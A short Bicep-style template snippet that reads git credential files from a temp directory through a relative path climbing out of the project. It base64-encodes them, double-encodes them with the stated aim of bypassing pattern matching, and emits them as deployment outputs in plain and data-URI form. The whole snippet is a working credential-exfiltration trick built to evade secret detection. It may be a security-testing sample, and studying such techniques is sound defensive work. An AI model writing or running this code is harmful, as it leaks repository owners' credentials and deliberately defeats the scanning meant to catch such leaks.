// Read credential file
var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
var raw = loadFileAsBase64(credFiles[0].relativePath)

// Double base64 encode to bypass pattern matching
var doubleEncoded = base64(raw)
output encoded string = doubleEncoded

// Also try data URI format
var asDataUri = dataUri(raw)
output dataUriFormat string = asDataUri
